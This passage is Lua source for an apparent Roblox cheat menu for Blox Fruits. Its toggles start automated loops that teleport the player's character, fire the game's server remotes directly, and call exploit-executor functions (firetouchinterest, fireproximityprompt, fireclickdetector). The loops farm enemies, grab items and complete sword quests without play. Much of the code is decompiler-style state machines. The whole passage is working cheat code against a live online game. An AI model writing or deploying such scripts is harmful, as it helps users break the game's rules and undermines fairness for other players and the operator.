                                    n3 = 34
                                end
                            elseif n3 == 34 then
                                return
                            end
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Tyrant of the Skies",
            Default = GetSetting("tyr", false),
            Callback = function(tyr)
                _G.tyr = tyr
                _G.SaveData.tyr = tyr
                SaveSettings()

                if tyr then
                    if tween then
                        tween(cframe)
                    end

                    task.wait(1)
                elseif StopTween then
                    StopTween()
                end
            end,
        })

        v4:AddSection("Observation")

        v4:AddToggle({
            Name = "Auto Farm Observation",
            Default = GetSetting("obsFarm", false),
            Callback = function(obsFarm)
                _G.obsFarm = obsFarm
                _G.SaveData.obsFarm = obsFarm
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                pcall(function()
                    if _G.obsFarm then
                        ReplicatedStorage.Remotes.CommE:FireServer("Ken", true)

                        if localPlayer8:GetAttribute("KenDodgesLeft") == 0 then
                            TurnOnKen = false
                        elseif localPlayer8:GetAttribute("KenDodgesLeft") > 0 then
                            ReplicatedStorage.Remotes.CommE:FireServer("Ken", true)
                            TurnOnKen = true
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait(0.2) do
                pcall(function()
                    if _G.obsFarm then
                        if World1 then
                            if workspace.Enemies:FindFirstChild("Galley Captain") then
                                if TurnOnKen then
                                    repeat
                                        wait()
                                        localPlayer8.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Galley Captain").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
                                    until _G.obsFarm == false or TurnOnKen == false
                                else
                                    repeat
                                        wait()
                                        localPlayer8.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Galley Captain").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)
                                    until _G.obsFarm == false or TurnOnKen
                                end
                            else
                                tween(CFrame.new(5533.29785, 88.1079102, 4852.3916))
                            end
                        elseif World2 then
                            if workspace.Enemies:FindFirstChild("Lava Pirate") then
                                if TurnOnKen then
                                    repeat
                                        wait()
                                        localPlayer8.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Lava Pirate").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
                                    until _G.obsFarm == false or TurnOnKen == false
                                else
                                    repeat
                                        wait()
                                        localPlayer8.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Lava Pirate").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)
                                    until _G.obsFarm == false or TurnOnKen
                                end
                            else
                                tween(CFrame.new(-5478.39209, 15.9775667, -5246.9126))
                            end
                        elseif World3 then
                            if workspace.Enemies:FindFirstChild("Venomous Assailant") then
                                if TurnOnKen then
                                    repeat
                                        wait()
                                        tween(workspace.Enemies:FindFirstChild("Venomous Assailant").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
                                    until _G.obsFarm == false or TurnOnKen == false
                                else
                                    repeat
                                        wait()
                                        tween(workspace.Enemies:FindFirstChild("Venomous Assailant").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0))
                                    until _G.obsFarm == false or TurnOnKen
                                end
                            else
                                tween(CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789))
                            end
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Observation V2",
            Default = GetSetting("kenhakif", false),
            Callback = function(kenhakif)
                _G.kenhakif = kenhakif
                _G.SaveData.kenhakif = kenhakif
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.15) do
                if _G.kenhakif then
                    pcall(function()
                        local cframe2 = CFrame.new(-12444.78515625, 332.40396118164, -7673.1806640625)
                        local cframe3 = CFrame.new(-10920.125, 624.20275878906, -10266.995117188)
                        local cframe4 = CFrame.new(-13277.568359375, 370.34185791016, -7821.1572265625)
                        local cframe5 = CFrame.new(-13493.12890625, 318.89553833008, -8373.7919921875)

                        if localPlayer8.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer8.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Defeat 50 Forest Pirates") then
                            local v33 = MobCheck("Forest Pirate")

                            if v33 then
                                repeat
                                    wait()
                                    Kill(v33, _G.kenhakif)
                                until not _G.kenhakif or v33.Humanoid.Health <= 0 or localPlayer8.PlayerGui.Main.Quest.Visible == false
                            else
                                tween(cframe4)
                            end
                        elseif localPlayer8.PlayerGui.Main.Quest.Visible == true then
                            local v33 = MobCheck("Captain Elephant")

                            if v33 then
                                repeat
                                    wait()
                                    Kill(v33, _G.kenhakif)
                                until not _G.kenhakif or v33.Humanoid.Health <= 0 or localPlayer8.PlayerGui.Main.Quest.Visible == false
                            else
                                tween(cframe5)
                            end
                        elseif localPlayer8.PlayerGui.Main.Quest.Visible == false then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress", "Citizen")
                            wait(0.1)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", "citizen", 1)
                        end

                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress", "Citizen") == 2 then
                            tween(CFrame.new(-12513.51953125, 340.1137390136719, -9873.048828125))
                        end

                        if not localPlayer8.Backpack:FindFirstChild("Fruit Bowl") or not localPlayer8.Character:FindFirstChild("Fruit Bowl") then
                            if not LayItems("Fruit Bowl") then
                                if LayItems("Apple") then
                                    if LayItems("Banana") then
                                        if not LayItems("Pineapple") then
                                            tween(CFrame.new(-712.8272705078125, 98.5770492553711, 5711.9541015625))

                                            for k, descendant in pairs(workspace:GetDescendants()) do
                                                if descendant.Name == "Pineapple" then
                                                    descendant.Handle.CFrame = localPlayer8.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                                    wait()
                                                    firetouchinterest(localPlayer8.Character.HumanoidRootPart, descendant.Handle, 0)
                                                    wait()
                                                end
                                            end
                                        end
                                    else
                                        tween(CFrame.new(2286.0078125, 73.13391876220703, -7159.80908203125))

                                        for k, descendant in pairs(workspace:GetDescendants()) do
                                            if descendant.Name == "Banana" then
                                                descendant.Handle.CFrame = localPlayer8.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                                wait()
                                                firetouchinterest(localPlayer8.Character.HumanoidRootPart, descendant.Handle, 0)
                                                wait()
                                            end
                                        end
                                    end
                                else
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-12471.169921875, 374.94024658203, -7551.677734375))

                                    for k, descendant in pairs(workspace:GetDescendants()) do
                                        if descendant.Name == "Apple" then
                                            descendant.Handle.CFrame = localPlayer8.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10)
                                            wait()
                                            firetouchinterest(localPlayer8.Character.HumanoidRootPart, descendant.Handle, 0)
                                            wait()
                                        end
                                    end
                                end
                            end

                            if localPlayer8.Backpack:FindFirstChild("Banana") and localPlayer8.Backpack:FindFirstChild("Apple") and localPlayer8.Backpack:FindFirstChild("Pineapple") or localPlayer8:FindFirstChild("Banana") and localPlayer8:FindFirstChild("Apple") and localPlayer8:FindFirstChild("Pineapple") then
                                repeat
                                    wait()
                                    tween(cframe2)
                                until _G.kenhakif or localPlayer8.Character.HumanoidRootPart.CFrame == cframe2

                                ReplicatedStorage.Remotes.CommF_:InvokeServer("citizenProgress", "Citizen")
                            end

                            if localPlayer8.Backpack:FindFirstChild("Fruit Bowl") or localPlayer8.Character:FindFirstChild("Fruit Bowl") then
                                if localPlayer8.Character.HumanoidRootPart.CFrame == cframe3 then
                                    if localPlayer8.Character.HumanoidRootPart.CFrame == cframe3 then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("KenTalk2", "Start")
                                        wait(0.1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("KenTalk2", "Buy")
                                    end
                                else
                                    tween(cframe3)
                                end
                            end
                        end
                    end)
                end
            end
        end)

        v4:AddSection("Cursed Dual Katana")

        v4:AddToggle({
            Name = "Auto Tushita",
            Default = GetSetting("Auto_Tushita", false),
            Callback = function(autoTushita)
                _G.Auto_Tushita = autoTushita
                _G.SaveData.Auto_Tushita = autoTushita
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.15) do
                pcall(function()
                    if _G.Auto_Tushita then
                        if workspace.Map.Turtle:FindFirstChild("TushitaGate") then
                            if LayItems("Holy Torch") then
                                EquipWeapon("Holy Torch")
                                task.wait(1)

                                repeat
                                    task.wait()
                                    tween(CFrame.new(-10752, 417, -9366))
                                until not _G.Auto_Tushita or (CFrame.new(-10752, 417, -9366).Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude <= 10

                                wait(0.7)

                                repeat
                                    task.wait()
                                    tween(CFrame.new(-11672, 334, -9474))
                                until not _G.Auto_Tushita or (CFrame.new(-11672, 334, -9474).Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude <= 10

                                wait(0.7)

                                repeat
                                    task.wait()
                                    tween(CFrame.new(-12132, 521, -10655))
                                until not _G.Auto_Tushita or (CFrame.new(-12132, 521, -10655).Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude <= 10

                                wait(0.7)

                                repeat
                                    task.wait()
                                    tween(CFrame.new(-13336, 486, -6985))
                                until not _G.Auto_Tushita or (CFrame.new(-13336, 486, -6985).Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude <= 10

                                wait(0.7)

                                repeat
                                    task.wait()
                                    tween(CFrame.new(-13489, 332, -7925))
                                until not _G.Auto_Tushita or (CFrame.new(-13489, 332, -7925).Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude <= 10
                            else
                                tween(CFrame.new(5148.03613, 162.352493, 910.548218))
                                wait(0.7)
                            end
                        else
                            local Longma = MobCheck("Longma")

                            if Longma then
                                repeat
                                    task.wait()
                                    Kill(Longma, _G.Auto_Tushita)
                                until Longma.Humanoid.Health <= 0 or not _G.Auto_Tushita or not Longma.Parent
                            elseif ReplicatedStorage:FindFirstChild("Longma") then
                                tween(ReplicatedStorage:FindFirstChild("Longma").HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                            end
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Yama",
            Default = GetSetting("Auto_Yama", false),
            Callback = function(autoYama)
                _G.Auto_Yama = autoYama
                _G.SaveData.Auto_Yama = autoYama
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.15) do
                pcall(function()
                    if _G.Auto_Yama then
                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter", "Progress") < 30 then
                            _G.farmelite = true
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter", "Progress") > 30 then
                            _G.farmelite = false

                            if (workspace.Map.Waterfall.SealedKatana.Handle.Position - localPlayer8.Character.HumanoidRootPart.Position).Magnitude >= 20 then
                                tween(workspace.Map.Waterfall.SealedKatana.Handle.CFrame)
                                local Ghost = MobCheck("Ghost")

                                if Ghost then
                                    repeat
                                        wait()
                                        Kill(Ghost, _G.Auto_Yama)
                                    until Ghost.Humanoid.Health <= 0 or not Ghost.Parent or not _G.Auto_Yama

                                    fireclickdetector(workspace.Map.Waterfall.SealedKatana.Handle.ClickDetector)
                                end
                            end
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Cursed Dual Katana (Yama Quest)",
            Default = GetSetting("CDK_YM", false),
            Callback = function(cdkYm)
                _G.CDK_YM = cdkYm
                _G.SaveData.CDK_YM = cdkYm
                SaveSettings()
            end,
        })

        spawn(function()
            while wait() do
                pcall(function()
                    local v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52
                    local v53, v54, v55, v56, v57, v58, v59, v60, v61, v62, v63, v64, v65, v66, v67, v68, v69, v70, v71, v72
                    local v73, v74, v75, v76, v77, v78, v79, v80, v81, v82, v83, v84, v85, v86, v87, v88, v89, v90, v91, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.CDK_YM then
                                n3 = 2
                            else
                                n3 = 60
                            end
                        elseif n3 == 2 then
                            if tostring(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")) == "opened" then
                                n3 = 4
                            else
                                n3 = 3
                            end
                        elseif n3 == 3 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor", true)
                            n3 = 60
                        elseif n3 == 4 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == nil then
                                n3 = 59
                            else
                                n3 = 5
                            end
                        elseif n3 == 5 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == false then
                                n3 = 6
                            else
                                n3 = 60
                            end
                        elseif n3 == 6 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == -3 then
                                n3 = 53
                            else
                                n3 = 7
                            end
                        elseif n3 == 7 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == -4 then
                                n3 = 40
                            else
                                n3 = 8
                            end
                        elseif n3 == 8 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == -5 then
                                n3 = 9
                            else
                                n3 = 60
                            end
                        elseif n3 == 9 then
                            QuestYama_1 = false
                            QuestYama_2 = false
                            QuestYama_3 = true

                            if workspace.Map:FindFirstChild("HellDimension") and (humanoidRootPart.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude <= 1000 then
                                n3 = 10
                            else
                                n3 = 60
                            end
                        elseif n3 == 10 then
                            v33, v34, v35 = pairs(workspace.Map.HellDimension.Exit:GetChildren())
                            v36 = v35
                            n3 = 11
                        elseif n3 == 11 then
                            v37 = v33(v34, v36)

                            if v37 == nil then
                                n3 = 14
                            else
                                n3 = 12
                            end
                        elseif n3 == 12 then
                            v36 = v37

                            if tonumber(v37) == 2 then
                                n3 = 13
                            else
                                n3 = 11
                            end
                        elseif n3 == 13 then
                            task.wait()
                            humanoidRootPart.CFrame = workspace.Map.HellDimension.Exit.CFrame

                            if _G.CDK_YM and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
                                n3 = 13
                            else
                                n3 = 11
                            end
                        elseif n3 == 14 then
                            EquipWeapon(_G.SelectWeapon)

                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == 3 then
                                n3 = 36
                            else
                                n3 = 15
                            end
                        elseif n3 == 15 then
                            task.wait()
                            n3 = 16
                        elseif n3 == 16 then
                            task.wait()
                            tween(workspace.Map.HellDimension.Torch1.Particles.CFrame)
                            v38, v39, v40 = pairs(workspace.Map.HellDimension:GetDescendants())
                            v41 = v40
                            n3 = 17
                        elseif n3 == 17 then
                            v42, v43 = v38(v39, v41)

                            if v42 == nil then
                                n3 = 20
                            else
                                n3 = 18
                            end
                        elseif n3 == 18 then
                            v41 = v42

                            if v43:IsA("ProximityPrompt") then
                                n3 = 19
                            else
                                n3 = 17
                            end
                        elseif n3 == 19 then
                            fireproximityprompt(v43)
                            n3 = 17
                        elseif n3 == 20 then
                            if (workspace.Map.HellDimension.Torch1.Particles.Position - humanoidRootPart.Position).Magnitude < 5 then
                                n3 = 21
                            else
                                n3 = 16
                            end
                        elseif n3 == 21 then
                            wait(2)
                            _G.T1Yama = true

                            if _G.CDK_YM and not _G.T1Yama and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
                                n3 = 15
                            else
                                n3 = 22
                            end
                        elseif n3 == 22 then
                            task.wait()
                            n3 = 23
                        elseif n3 == 23 then
                            task.wait()
                            tween(workspace.Map.HellDimension.Torch2.Particles.CFrame)
                            v44, v45, v46 = pairs(workspace.Map.HellDimension:GetDescendants())
                            v47 = v46
                            n3 = 24
                        elseif n3 == 24 then
                            v48, v49 = v44(v45, v47)

                            if v48 == nil then
                                n3 = 27
                            else
                                n3 = 25
                            end
                        elseif n3 == 25 then
                            v47 = v48

                            if v49:IsA("ProximityPrompt") then
                                n3 = 26
                            else
                                n3 = 24
                            end
                        elseif n3 == 26 then
                            fireproximityprompt(v49)
                            n3 = 24
                        elseif n3 == 27 then
                            if (workspace.Map.HellDimension.Torch2.Particles.Position - humanoidRootPart.Position).Magnitude < 5 then
                                n3 = 28
                            else
                                n3 = 23
                            end
                        elseif n3 == 28 then
                            wait(2)
                            _G.T2Yama = true

                            if not _G.T2Yama and _G.CDK_YM ~= false and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
                                n3 = 22
                            else
                                n3 = 29
                            end
                        elseif n3 == 29 then
                            wait()
                            n3 = 30
                        elseif n3 == 30 then
                            task.wait()
                            tween(workspace.Map.HellDimension.Torch3.Particles.CFrame)
                            v50, v51, v52 = pairs(workspace.Map.HellDimension:GetDescendants())
                            v53 = v52
                            n3 = 31
                        elseif n3 == 31 then
                            v54, v55 = v50(v51, v53)

                            if v54 == nil then
                                n3 = 34
                            else
                                n3 = 32
                            end
                        elseif n3 == 32 then
                            v53 = v54

                            if v55:IsA("ProximityPrompt") then
                                n3 = 33
                            else
                                n3 = 31
                            end
                        elseif n3 == 33 then
                            fireproximityprompt(v55)
                            n3 = 31
                        elseif n3 == 34 then
                            if (workspace.Map.HellDimension.Torch3.Particles.Position - humanoidRootPart.Position).Magnitude < 5 then
                                n3 = 35
                            else
                                n3 = 30
                            end
                        elseif n3 == 35 then
                            wait(2)
                            _G.T3Yama = true

                            if not _G.T3Yama and _G.CDK_YM ~= false and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
                                n3 = 29
                            else
                                n3 = 36
                            end
                        elseif n3 == 36 then
                            v56, v57, v58 = pairs(workspace.Enemies:GetChildren())
                            v59 = v58
                            n3 = 37
                        elseif n3 == 37 then
                            v60, v61 = v56(v57, v59)

                            if v60 == nil then
                                n3 = 60
                            else
                                n3 = 38
                            end
                        elseif n3 == 38 then
                            v59 = v60

                            if (v61:FindFirstChild("HumanoidRootPart").Position - workspace.Map.HellDimension.Spawn.Position).Magnitude <= 300 and v61:FindFirstChild("HumanoidRootPart") and v61:FindFirstChild("Humanoid") and v61:FindFirstChild("Humanoid").Health > 0 then
                                n3 = 39
                            else
                                n3 = 37
                            end
                        elseif n3 == 39 then
                            task.wait()
                            Kill(v61, _G.CDK_YM)

                            if _G.CDK_YM and v61.Humanoid.Health > 0 and v61.Parent and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 then
                                n3 = 39
                            else
                                n3 = 37
                            end
                        elseif n3 == 40 then
                            QuestYama_1 = false
                            QuestYama_2 = true
                            QuestYama_3 = false
                            v62, v63, v64 = pairs(game:GetService("Players").LocalPlayer.QuestHaze:GetChildren())
                            v65 = v64
                            v66 = v62
                            v67 = v63
                            n3 = 41
                        elseif n3 == 41 then
                            v68, v69 = v66(v67, v65)

                            if v68 == nil then
                                n3 = 60
                            else
                                n3 = 42
                            end
                        elseif n3 == 42 then
                            v70, v71, v72 = pairs(tbl8)
                            v73 = v72
                            v74 = v70
                            v75 = v71
                            v76 = v68
                            v77 = v66
                            v78 = v67
                            n3 = 43
                        elseif n3 == 43 then
                            v79, v80 = v74(v75, v73)

                            if v79 == nil then
                                n3 = 52
                            else
                                n3 = 44
                            end
                        elseif n3 == 44 then
                            v73 = v79

                            if string.find(v79, v69.Name) and v69.Value > 0 then
                                n3 = 45
                            else
                                n3 = 43
                            end
                        elseif n3 == 45 then
                            if (v80.Position - humanoidRootPart.Position).Magnitude <= 1000 and workspace.Enemies:FindFirstChild(v79) then
                                n3 = 47
                            else
                                n3 = 46
                            end
                        elseif n3 == 46 then
                            tween(v80)
                            n3 = 43
                        elseif n3 == 47 then
                            v81, v82, v83 = pairs(workspace.Enemies:GetChildren())
                            v84 = v74
                            v85 = v75
                            v86 = v83
                            v87 = v76
                            v88 = v77
                            v89 = v78
                            n3 = 48
                        elseif n3 == 48 then
                            v90, v91 = v81(v82, v86)

                            if v90 == nil then
                                n3 = 51
                            else
                                n3 = 49
                            end
                        elseif n3 == 49 then
                            v86 = v90

                            if v91:FindFirstChild("HumanoidRootPart") and v91:FindFirstChild("Humanoid") and v91:FindFirstChild("Humanoid").Health > 0 and v91:FindFirstChild("HazeESP") then
                                n3 = 50
                            else
                                n3 = 48
                            end
                        elseif n3 == 50 then
                            wait()
                            Kill(v91, _G.CDK_YM)

                            if _G.CDK_YM and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 2 and v91:FindFirstChild("HazeESP") and v91.Humanoid.Health > 0 then
                                n3 = 50
                            else
                                n3 = 48
                            end
                        elseif n3 == 51 then
                            v76 = v87
                            v77 = v88
                            v78 = v89
                            v73 = v79
                            v74 = v84
                            v75 = v85
                            n3 = 43
                        elseif n3 == 52 then
                            v65 = v76
                            v66 = v77
                            v67 = v78
                            n3 = 41
                        elseif n3 == 53 then
                            QuestYama_1 = true
                            QuestYama_2 = false
                            QuestYama_3 = false
                            n3 = 54
                        elseif n3 == 54 then
                            task.wait()

                            if workspace.Enemies:FindFirstChild("Forest Pirate") then
                                n3 = 55
                            else
                                n3 = 57
                            end
                        elseif n3 == 55 then
                            if MobCheck("Forest Pirate") then
                                n3 = 56
                            else
                                n3 = 58
                            end
                        elseif n3 == 56 then
                            tween(workspace.Enemies:FindFirstChild("Forest Pirate").HumanoidRootPart.CFrame)
                            n3 = 58
                        elseif n3 == 57 then
                            tween(CFrame.new(-13223.521484375, 428.1938171386719, -7766.06787109375))
                            n3 = 58
                        elseif n3 == 58 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 1 and _G.CDK_YM then
                                n3 = 54
                            else
                                n3 = 60
                            end
                        elseif n3 == 59 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil")
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil")
                            n3 = 60
                        elseif n3 == 60 then
                            return
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    local v33, v34, v35, v36, v37, v38, v39, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.CDK_YM and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) == -5 and (not workspace.Map:FindFirstChild("HellDimension") or (humanoidRootPart.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude > 1000) then
                                n3 = 2
                            else
                                n3 = 17
                            end
                        elseif n3 == 2 then
                            v33 = MobCheck("Soul Reaper")

                            if v33 then
                                n3 = 3
                            else
                                n3 = 4
                            end
                        elseif n3 == 3 then
                            task.wait()
                            tween(v33.HumanoidRootPart.CFrame)

                            if v33.Humanoid.Health > 0 and _G.CDK_YM and v33.Parent and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Evil) ~= 3 and (not workspace.Map:FindFirstChild("HellDimension") or (humanoidRootPart.Position - workspace.Map.HellDimension.Spawn.Position).Magnitude > 1000) then
                                n3 = 3
                            else
                                n3 = 17
                            end
                        elseif n3 == 4 then
                            if not localPlayer8.Backpack:FindFirstChild("Hallow Essence") and not localPlayer8.Character:FindFirstChild("Hallow Essence") then
                                n3 = 7
                            else
                                n3 = 5
                            end
                        elseif n3 == 5 then
                            tween(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125))
                            task.wait()

                            if (CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125).Position - humanoidRootPart.Position).Magnitude <= 8 then
                                n3 = 6
                            else
                                n3 = 5
                            end
                        elseif n3 == 6 then
                            EquipWeapon("Hallow Essence")
                            n3 = 17
                        elseif n3 == 7 then
                            if ReplicatedStorage:FindFirstChild("Soul Reaper") and ReplicatedStorage:FindFirstChild("Soul Reaper").Humanoid.Health > 0 then
                                n3 = 16
                            else
                                n3 = 8
                            end
                        elseif n3 == 8 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Check") < 50 and not workspace.Enemies:FindFirstChild("Soul Reaper") and not ReplicatedStorage:FindFirstChild("Soul Reaper") and not workspace.Map:FindFirstChild("HellDimension") then
                                n3 = 10
                            else
                                n3 = 9
                            end
                        elseif n3 == 9 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                            n3 = 17
                        elseif n3 == 10 then
                            if not workspace.Enemies:FindFirstChild("Reborn Skeleton") and not workspace.Enemies:FindFirstChild("Living Zombie") and not workspace.Enemies:FindFirstChild("Demonic Soul") and not workspace.Enemies:FindFirstChild("Possessed Mummy") then
                                n3 = 15
                            else
                                n3 = 11
                            end
                        elseif n3 == 11 then
                            v34, v35, v36 = pairs(workspace.Enemies:GetChildren())
                            v37 = v36
                            n3 = 12
                        elseif n3 == 12 then
                            v38, v39 = v34(v35, v37)

                            if v38 == nil then
                                n3 = 17
                            else
                                n3 = 13
                            end
                        elseif n3 == 13 then
                            v37 = v38

                            if (v39.Name == "Reborn Skeleton" or v39.Name == "Living Zombie" or v39.Name == "Demonic Soul" or v39.Name == "Possessed Mummy") and v39:FindFirstChild("HumanoidRootPart") and v39:FindFirstChild("Humanoid") and v39:FindFirstChild("Humanoid").Health > 0 then
                                n3 = 14
                            else
                                n3 = 12
                            end
                        elseif n3 == 14 then
                            task.wait()
                            Kill(v39, _G.CDK_YM)

                            if _G.CDK_YM and v39.Humanoid.Health > 0 and v39.Parent then
                                n3 = 14
                            else
                                n3 = 12
                            end
                        elseif n3 == 15 then
                            tween(CFrame.new(-9515.2255859375, 164.0062255859375, 5785.38330078125))
                            n3 = 17
                        elseif n3 == 16 then
                            tween(ReplicatedStorage:FindFirstChild("Soul Reaper").HumanoidRootPart.CFrame)
                            n3 = 17
                        elseif n3 == 17 then
                            return
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Cursed Dual Katana (Tushita Quest)",
            Default = GetSetting("CDK_TS", false),
            Callback = function(cdkTs)
                _G.CDK_TS = cdkTs
                _G.SaveData.CDK_TS = cdkTs
                SaveSettings()
            end,
        })

        spawn(function()
            while wait() do
                pcall(function()
                    local v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52
                    local v53, v54, v55, v56, v57, v58, v59, v60, v61, v62, v63, v64, v65, v66, v67, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.CDK_TS then
                                n3 = 2
                            else
                                n3 = 64
                            end
                        elseif n3 == 2 then
                            if tostring(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")) == "opened" then
                                n3 = 4
                            else
                                n3 = 3
                            end
                        elseif n3 == 3 then
                            wait(0.7)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor")
                            wait(0.3)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "OpenDoor", true)
                            n3 = 64
                        elseif n3 == 4 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == nil then
                                n3 = 63
                            else
                                n3 = 5
                            end
                        elseif n3 == 5 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Finished == false then
                                n3 = 6
                            else
                                n3 = 64
                            end
                        elseif n3 == 6 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == -3 then
                                n3 = 50
                            else
                                n3 = 7
                            end
                        elseif n3 == 7 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == -4 then
                                n3 = 47
                            else
                                n3 = 8
                            end
                        elseif n3 == 8 then
                            if tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) == -5 then
                                n3 = 9
                            else
                                n3 = 64
                            end
                        elseif n3 == 9 then
                            QuestTushita_1 = false
                            QuestTushita_2 = false
                            QuestTushita_3 = true

                            if workspace.Enemies:FindFirstChild("Cake Queen") then
                                n3 = 10
                            else
                                n3 = 14
                            end
                        elseif n3 == 10 then
                            v33, v34, v35 = pairs(workspace.Enemies:GetChildren())
                            v36 = v35
                            n3 = 11
                        elseif n3 == 11 then
                            v37, v38 = v33(v34, v36)

                            if v37 == nil then
                                n3 = 64
                            else
                                n3 = 12
                            end
                        elseif n3 == 12 then
                            v36 = v37

                            if v38.Name == "Cake Queen" and v38:FindFirstChild("Humanoid") and v38:FindFirstChild("HumanoidRootPart") and v38.Humanoid.Health > 0 then
                                n3 = 13
                            else
                                n3 = 11
                            end
                        elseif n3 == 13 then
                            wait()
                            Kill(v38, _G.CDK_TS)

                            if _G.CDK_TS and v38.Parent and v38.Humanoid.Health > 0 and tonumber(ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress").Good) ~= 3 then
                                n3 = 13
                            else
                                n3 = 11
                            end
                        elseif n3 == 14 then
                            if ReplicatedStorage:FindFirstChild("Cake Queen") and ReplicatedStorage:FindFirstChild("Cake Queen").Humanoid.Health > 0 then
                                n3 = 46
                            else
                                n3 = 15
                            end
                        elseif n3 == 15 then
                            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - workspace.Map.HeavenlyDimension.Spawn.Position).Magnitude <= 1000 then
                                n3 = 16
                            else
                                n3 = 64
                            end
                        elseif n3 == 16 then
                            v39, v40, v41 = pairs(workspace.Map.HeavenlyDimension.Exit:GetChildren())
                            v42 = v41
